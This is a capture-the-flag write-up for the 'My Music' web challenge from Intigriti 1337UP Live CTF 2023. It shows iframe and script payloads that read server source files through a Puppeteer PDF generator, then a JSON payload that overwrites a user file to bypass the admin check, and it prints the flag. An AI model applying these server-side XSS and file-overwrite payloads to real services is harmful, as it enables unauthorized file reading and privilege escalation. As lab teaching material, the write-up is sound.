---
name: My Music (2023)
event: Intigriti 1337UP Live CTF 2023
category: Web
description: Writeup for My Music (Web) - Intigriti 1337UP Live CTF (2023) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# My Music

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/JetPydd3ud4/0.jpg)](https://www.youtube.com/watch?v=JetPydd3ud4 "My Music: Leveraging Server Side XSS (PDF) for Auth Bypass")

## Description

> Checkout my new platform for sharing the tunes of your life! 🎶

## Enumeration

Register an account, notice we are given a login hash to save, e.g. `25d6a4cec174932f1effd56e2273be5198c3be06ddf03ab380a7ffc4cf3ef4e8`.

We can `generate profile card` which creates a PDF but [by default] the request/response doesn't show in burp, let's make some adjustments:

-   Set burp scope to `https://mymusic.ctf.intigriti.io` and tick the `only show in-scope items` option in HTTP history tab (reduces noise, especially from spotify requests).
-   Tick `images` and `other binary` in the the `filter by MIME type` section of the HTTP history options (ensuring our PDF generation is shown).

We can update three sections of our profile; `First name`, `Last name` and `Spotify track code`. For each element we add some HTML tags, e.g. `<b>crypto</b>` and try to generate a new profile card. All three elements are reflected in the PDF document, but only the `Spotify track code` is in bold.

Now we have found HTML injection, we can try and [server-side XSS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf) to identify the file structure.

{% code overflow="wrap" %}
```js
<script>document.body.append(location.href)</script>
```
{% endcode %}

Returns `file:///app/tmp/3c433348-60e3-4a48-b989-2a168954147f.html`

Since we confirmed the file location as `/app`, we can enumerate common files, either manually or by brute-forcing a [wordlist](https://github.com/danielmiessler/SecLists).

#### app/app.js

{% code overflow="wrap" %}
```js
<iframe src="/app/app.js" style="width: 999px; height: 999px"></iframe>
```
{% endcode %}

We'll quickly recover the source code for `app.js`.

{% code overflow="wrap" %}
```js
const express = require("express");
const { engine } = require("express-handlebars");
const cookieParser = require("cookie-parser");
const { auth } = require("./middleware/auth");
const app = express();
app.engine("handlebars", engine());
app.set("view engine", "handlebars");
app.set("views", "./views");
app.use(express.json());
app.use(cookieParser());
app.use(auth);
app.use("/static", express.static("static"));
app.use("/", require("./routes/index"));
app.use("/api", require("./routes/api"));
app.listen(3000, () => {
    console.log("Listening on port 3000...");
});
```
{% endcode %}

This introduces some new paths to investigate (`/routes/index` and `/routes/api`) so we repeat the previous technique.

#### app/routes/index.js

{% code overflow="wrap" %}
```js
<iframe src="/app/routes/index.js" style="width: 999px; height: 999px"></iframe>
```
{% endcode %}

`index.js` confirms our target is the `/admin` endpoint. Currently, when we try to access the page we get `Only admins can view this page`.

{% code overflow="wrap" %}
```js
const express = require("express");
const { requireAuth } = require("../middleware/auth");
const { isAdmin } = require("../middleware/check_admin");
const { getRandomRecommendation } = require("../utils/recommendedSongs");
const { generatePDF } = require("../utils/generateProfileCard");
const router = express.Router();
router.get("/", (req, res) => {
    const spotifyTrackCode = getRandomRecommendation();
    res.render("home", { userData: req.userData, spotifyTrackCode });
});
router.get("/register", (req, res) => {
    res.render("register", { userData: req.userData });
});
router.get("/login", (req, res) => {
    if (req.loginHash) {
        res.redirect("/profile");
    }
    res.render("login", { userData: req.userData });
});
router.get("/logout", (req, res) => {
    res.clearCookie("login_hash");
    res.redirect("/");
});
router.get("/profile", requireAuth, (req, res) => {
    res.render("profile", { userData: req.userData, loginHash: req.loginHash });
});
router.post("/profile/generate-profile-card", requireAuth, async (req, res) => {
    const pdf = await generatePDF(req.userData, req.body.userOptions);
    res.contentType("application/pdf");
    res.send(pdf);
});
router.get("/admin", isAdmin, (req, res) => {
    res.render("admin", { flag: process.env.FLAG || "CTF{DUMMY}" });
});
module.exports = router;
```
{% endcode %}

It also revealed some new paths (`/middleware/auth`, `/middleware/check_admin`, `/utils/recommendedSongs` and `/utils/generateProfileCard`), which we'll return to shortly.

#### app/routes/api.js

{% code overflow="wrap" %}
```js
<iframe src="/app/routes/api.js" style="width: 999px; height: 999px"></iframe>
```
{% endcode %}

`api.js` deals with the register/login/update functionality, nothing particularly interesting.

{% code overflow="wrap" %}
```js
const express = require("express");
const { body, cookie } = require("express-validator");
const {
    addUser,
    getUserData,
    updateUserData,
    authenticateAsUser,
} = require("../controllers/user");
const router = express.Router();
router.post(
    "/register",
    body("username").not().isEmpty().withMessage("Username cannot be empty"),
    body("firstName").not().isEmpty().withMessage("First name cannot be empty"),
    body("lastName").not().isEmpty().withMessage("Last name cannot be empty"),
    addUser
);
router.post(
    "/login",
    body("loginHash").not().isEmpty().withMessage("Login hash cannot be empty"),
    authenticateAsUser
);
router
    .get("/user", getUserData)
    .put(
        "/user",
        body("firstName")
            .not()
            .isEmpty()
            .withMessage("First name cannot be empty"),
        body("lastName")
            .not()
            .isEmpty()
            .withMessage("Last name cannot be empty"),
        body("spotifyTrackCode")
            .not()
            .isEmpty()
            .withMessage("Spotify track code cannot be empty"),
        cookie("login_hash").not().isEmpty().withMessage("Login hash required"),
        updateUserData
    );
module.exports = router;
```
{% endcode %}

However, it does give us a new file to check out (`/controllers/user`).

#### app/controllers/user.js

{% code overflow="wrap" %}
```js
<iframe
    src="/app/controllers/user.js"
    style="width: 999px; height: 999px"
></iframe>
```
{% endcode %}

This file is responsible for adding, updating and _verifying_ users.

{% code overflow="wrap" %}
```js
const {
    createUser,
    getUser,
    setUserData,
    userExists,
} = require("../services/user");
const { validationResult } = require("express-validator");
const addUser = (req, res, next) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
        return res.status(400).send(errors.array());
    }
    const { username, firstName, lastName } = req.body;
    const userData = {
        username,
        firstName,
        lastName,
    };
    try {
        const loginHash = createUser(userData);
        res.status(204);
        res.cookie("login_hash", loginHash, { secure: false, httpOnly: true });
        res.send();
    } catch (e) {
        console.log(e);
        res.status(500);
        res.send("Error creating user!");
    }
};
const getUserData = (req, res, next) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
        return res.status(400).send(errors.array());
    }
    const { loginHash } = req.body;
    try {
        const userData = getUser(loginHash);
        res.send(JSON.parse(userData));
    } catch (e) {
        console.log(e);
        res.status(500);
        res.send("Error fetching user!");
    }
};
const updateUserData = (req, res, next) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
        return res.status(400).send(errors.array());
    }
    const { firstName, lastName, spotifyTrackCode } = req.body;
    const userData = {
        username: req.userData.username,
        firstName,
        lastName,
        spotifyTrackCode,
    };
    try {
        setUserData(req.loginHash, userData);
        res.send();
    } catch (e) {
        console.log(e);
    }
};
```
{% endcode %}

We find a `/services/user` endpoint, which might be interesting since the `getUser(loginHash)` function is imported from there.

#### app/controllers/user.js

{% code overflow="wrap" %}
```js
<iframe
    src="/app/services/user.js"
    style="width: 999px; height: 999px"
></iframe>
```
{% endcode %}

Now we learn more about how users are stored!

{% code overflow="wrap" %}
```js
const fs = require("fs");
const path = require("path");
const { createHash } = require("crypto");
const { v4: uuidv4 } = require("uuid");
const dataDir = "./data";
const createUser = (userData) => {
    const loginHash = createHash("sha256").update(uuidv4()).digest("hex");
    fs.writeFileSync(
        path.join(dataDir, `${loginHash}.json`),
        JSON.stringify(userData)
    );
    return loginHash;
};
const setUserData = (loginHash, userData) => {
    if (!userExists(loginHash)) {
        throw "Invalid login hash";
    }
    fs.writeFileSync(
        path.join(dataDir, `${path.basename(loginHash)}.json`),
        JSON.stringify(userData)
    );
    return userData;
};
const getUser = (loginHash) => {
    let userData = fs.readFileSync(
        path.join(dataDir, `${path.basename(loginHash)}.json`),
        {
            encoding: "utf8",
        }
    );
    return userData;
};
const userExists = (loginHash) => {
    return fs.existsSync(
        path.join(dataDir, `${path.basename(loginHash)}.json`)
    );
};
module.exports = { createUser, getUser, setUserData, userExists };
```
{% endcode %}

First of all we see the `./data` folder, useful knowledge as we already have a method of reading (maybe writing) files.

Secondly, we discover how user files are formatted.

{% code overflow="wrap" %}
```js
const loginHash = createHash("sha256").update(uuidv4()).digest("hex");
fs.writeFileSync(
    path.join(dataDir, `${loginHash}.json`),
    JSON.stringify(userData)
);
```
{% endcode %}

Since our login hash is displayed on the page, we know exactly where our user object is located.

{% code overflow="wrap" %}
```bash
/app/data/25d6a4cec174932f1effd56e2273be5198c3be06ddf03ab380a7ffc4cf3ef4e8.json
```
{% endcode %}

#### app/middleware/check_admin.js

Returning back to the four new endpoints we found in `app/routes/index.js`. The most interesting is likely to be `check_admin.js`. Why is this most interesting to us? Because we want to be admin, of course!

{% code overflow="wrap" %}
```js
<iframe
    src="/app/middleware/check_admin.js"
    style="width: 999px; height: 999px"
></iframe>
```
{% endcode %}

{% code overflow="wrap" %}
```js
const { getUser, userExists } = require("../services/user");
const isAdmin = (req, res, next) => {
    let loginHash = req.cookies["login_hash"];
    let userData;
    if (loginHash && userExists(loginHash)) {
        userData = getUser(loginHash);
    } else {
        return res.redirect("/login");
    }
    try {
        userData = JSON.parse(userData);
        if (userData.isAdmin !== true) {
            res.status(403);
            res.send("Only admins can view this page");
            return;
        }
    } catch (e) {
        console.log(e);
    }
    next();
};
module.exports = { isAdmin };
```
{% endcode %}

OK, so the `userData` JSON object will be parsed, and if the `isAdmin` property isn't `true`, we won't be granted access.

At this point we might think about how we could inject `isAdmin: true` into our user object 🤔

Another question we may consider; what happens if the JSON object cannot be parsed? 👀

Let's revisit the code from `/app/routes/index.js`. Specifically, the `generate-profile-card` POST request.

{% code overflow="wrap" %}
```js
router.post("/profile/generate-profile-card", requireAuth, async (req, res) => {
    const pdf = await generatePDF(req.userData, req.body.userOptions);
    res.contentType("application/pdf");
    res.send(pdf);
});
```
{% endcode %}

We already knew that our `userData` would be inserted to the PDF (that's how we were able to inject code), but what's this `userOptions` parameter? Let's go find out!

#### app/utils/generateProfileCard.js

{% code overflow="wrap" %}
```js
<iframe
    src="/app/utils/generateProfileCard.js"
    style="width: 999px; height: 999px"
></iframe>
```
{% endcode %}

We found this endpoint earlier when checking `/app/routes/index.js`.

{% code overflow="wrap" %}
```js
const puppeteer = require("puppeteer");
const fs = require("fs");
const path = require("path");
const { v4: uuidv4 } = require("uuid");
const Handlebars = require("handlebars");
const generatePDF = async (userData, userOptions) => {
    let templateData = fs.readFileSync(
        path.join(__dirname, "../views/print_profile.handlebars"),
        {
            encoding: "utf8",
        }
    );
    const template = Handlebars.compile(templateData);
    const html = template({ userData: userData });
    const filePath = path.join(__dirname, `../tmp/${uuidv4()}.html`);
    fs.writeFileSync(filePath, html);
    const browser = await puppeteer.launch({
        executablePath: "/usr/bin/google-chrome",
        args: ["--no-sandbox"],
    });
    const page = await browser.newPage();
    await page.goto(`file://${filePath}`, { waitUntil: "networkidle0" });
    await page.emulateMediaType("screen");
    let options = {
        format: "A5",
    };
    if (userOptions) {
        options = { ...options, ...userOptions };
    }
    const pdf = await page.pdf(options);
    await browser.close();
    fs.unlinkSync(filePath);
    return pdf;
};
module.exports = { generatePDF };
```
{% endcode %}

This part is notable; our `userOptions` are passed as options to the `pdf` function in puppeteer.

{% code overflow="wrap" %}
```js
if (userOptions) {
    options = { ...options, ...userOptions };
}
const pdf = await page.pdf(options);
```
{% endcode %}

Time to [RTFM](https://pptr.dev/api/puppeteer.pdfoptions) 🤷‍♂️

| Property | Modifiers  | Type   | Description                  | Default                                                      |
| -------- | ---------- | ------ | ---------------------------- | ------------------------------------------------------------ |
| path     | `optional` | string | The path to save the file to | `undefined`, which means the PDF will not be written to disk |

## Exploitation

OK, enough with the recon. exploit time!

-   When we try to access the `/admin` endpoint, it will parse our `userData` JSON object and return a 403 error if it does not contain `isAdmin: true`.
-   However, if the JSON object cannot be parsed (as hinted earlier), then the code following the if statement (that returns a 403 response) will not be reached.
-   Does this mean we won't be rejected from viewing the admin page? Let's find out!

### Attack Plan

1. We know we can control the `userOptions` which is passed to the puppeteer `pdf` function.
2. We identified the `path` property that allows us to control the location where the generated PDF will be stored.
3. We found that user objects are stored in `/app/data/<login_hash>.json`

Putting all this together, we create a payload that will overwrite our user object with a generated PDF.

{% code overflow="wrap" %}
```json
{
    "userOptions": {
        "path": "/app/data/25d6a4cec174932f1effd56e2273be5198c3be06ddf03ab380a7ffc4cf3ef4e8.json"
    }
}
```
{% endcode %}

We send this payload in the POST request used to generate a PDF (make sure to set content-type to `application/json`). When we login with the hash and return to `/admin`, we get the flag.

Flag:`INTIGRITI{0verr1d1ng_4nd_n0_r3turn_w4s_n3ed3d_for_th15_fl4g_to_b3_e4rn3d}`

Note: I used this technique to overwrite our existing user object with a PDF (invalid JSON), but you could pick a filename of your choice, e.g.

{% code overflow="wrap" %}
```json
{
    "userOptions": {
        "path": "/app/data/cat.json"
    }
}
```
{% endcode %}

Then just login with the hash `cat` and visit the admin page to receive the flag 😊
